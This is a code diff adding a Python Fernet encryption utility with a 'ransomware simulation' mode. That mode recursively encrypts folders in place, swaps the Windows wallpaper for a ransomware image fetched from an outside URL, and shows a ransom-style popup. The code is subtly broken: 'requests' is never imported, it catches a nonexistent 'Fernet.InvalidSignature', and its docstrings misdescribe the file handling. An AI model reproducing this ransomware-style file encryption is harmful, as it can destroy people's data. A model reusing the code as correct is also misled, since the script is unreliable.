@@ -1,0 +1,148 @@
+from cryptography.fernet import Fernet
+import os
+import ctypes
+import tkinter as tk
+from tkinter import messagebox
+
+def encrypt_file(key, filepath):
+    """Encrypts a file using the provided key and filepath.
+    Deletes the original file and replaces it with the encrypted version."""
+    with open(filepath, 'rb') as file:
+        data = file.read()
+    fernet = Fernet(key)
+    encrypted_data = fernet.encrypt(data)
+    with open(filepath, 'wb') as file:
+        file.write(encrypted_data)
+    print(f"File encrypted successfully: {filepath}")
+
+def decrypt_file(key, filepath):
+    """Decrypts a file using the provided key and filepath.
+    Deletes the encrypted file and replaces it with the decrypted version."""
+    with open(filepath, 'rb') as file:
+        encrypted_data = file.read()
+    fernet = Fernet(key)
+    try:
+        decrypted_data = fernet.decrypt(encrypted_data)
+    except Fernet.InvalidSignature:
+        print(f"Error: Invalid decryption key or corrupt file.")
+        return
+    with open(filepath, 'wb') as file:
+        file.write(decrypted_data)
+    print(f"File decrypted successfully: {filepath}")
+
+def encrypt_message(key, message):
+    """Encrypts a message using the provided key and prints the ciphertext."""
+    fernet = Fernet(key)
+    encrypted_message = fernet.encrypt(message.encode()).decode()
+    print(f"Encrypted message: {encrypted_message}")
+
+def decrypt_message(key, message):
+    """Decrypts a message using the provided key and prints the cleartext."""
+    fernet = Fernet(key)
+    try:
+        decrypted_message = fernet.decrypt(message.encode()).decode()
+    except Fernet.InvalidSignature:
+        print(f"Error: Invalid decryption key or corrupt message.")
+        return
+    print(f"Decrypted message: {decrypted_message}")
+
+def write_key():
+    """Generates a key and save it into a file"""
+    key = Fernet.generate_key()
+    with open("key.key", "wb") as key_file:
+        key_file.write(key)
+
+def load_key():
+    """Loads the key from the current directory named `key.key`"""
+    key = open("key.key", "rb").read()
+    return key
+
+def encrypt_folder(key, folder_path):
+    """Recursively encrypts a folder and all its contents."""
+    for root, _, files in os.walk(folder_path):
+        for file in files:
+            file_path = os.path.join(root, file)
+            encrypt_file(key, file_path)
+
+def decrypt_folder(key, folder_path):
+    """Recursively decrypts a folder and all its contents."""
+    for root, _, files in os.walk(folder_path):
+        for file in files:
+            file_path = os.path.join(root, file)
+            decrypt_file(key, file_path)
+
+def download_image(url, local_path):
+    """Download ransomware wallpaper"""
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(local_path, 'wb') as file:
+            file.write(response.content)
+    else:
+        raise Exception(f"Failed to download image from {url}")
+
+def show_popup():
+    """Creates pop-up with a message for the user"""
+    message = "Your files have been encrypted! To decrypt your files, follow the instructions in the README file."  # Predefined ransomware message
+    # Create a popup window with a ransomware message
+    root = tk.Tk()
+    root.withdraw()  # Hide the main window
+    messagebox.showerror("Ransomware Simulation", message)
+
+def set_wallpaper():
+    """Sets the wallpaper for the ransomware simulation"""
+    wallpaper_url = "https://image-optimizer.cyberriskalliance.com/unsafe/768x0/https://files.scmagazine.com/wp-content/uploads/2023/10/1020_ransomware.jpg"  # URL of the wallpaper image
+    local_path = os.path.join(os.getenv('TEMP'), "wallpaper.jpg")  # Temporary location to save the downloaded image
+    
+    download_image(wallpaper_url, local_path)
+    
+    # Change the desktop wallpaper to the specified image and make it permanent
+    ctypes.windll.user32.SystemParametersInfoW(20, 0, local_path, 3)
+
+def main():
+    """Prompts user for mode selection and performs corresponding actions."""
+    print("Select a mode:")
+    print("1. Encrypt a file")
+    print("2. Decrypt a file")
+    print("3. Encrypt a message")
+    print("4. Decrypt a message")
+    print("5. Encrypt a folder")
+    print("6. Decrypt a folder")
+    print("7. Simulate ransomware")
+    print("8. Turn off")
+    
+    key = load_key()
+    
+    while True:
+        mode = input("Enter your choice (1-8): ")
+        
+        if mode == '1':
+            filepath = input("Enter the file path to encrypt: ")
+            encrypt_file(key, filepath)
+        elif mode == '2':
+            filepath = input("Enter the file path to decrypt: ")
+            decrypt_file(key, filepath)
+        elif mode == '3':
+            message = input("Enter the message to encrypt: ")
+            encrypt_message(key, message)
+        elif mode == '4':
+            message = input("Enter the message to decrypt: ")
+            decrypt_message(key, message)
+        elif mode == '5':
+            folder_path = input("Enter the folder path to encrypt: ")
+            encrypt_folder(key, folder_path)
+        elif mode == '6':
+            folder_path = input("Enter the folder path to decrypt: ")
+            decrypt_folder(key, folder_path)
+        elif mode == '7':
+            set_wallpaper()
+            show_popup()
+            print("\nRansomware simulation complete!\n")
+            break
+        elif mode == '8':
+            break
+        else:
+            print("Invalid mode selection.")
+
+if __name__ == "__main__":
+    main()
+
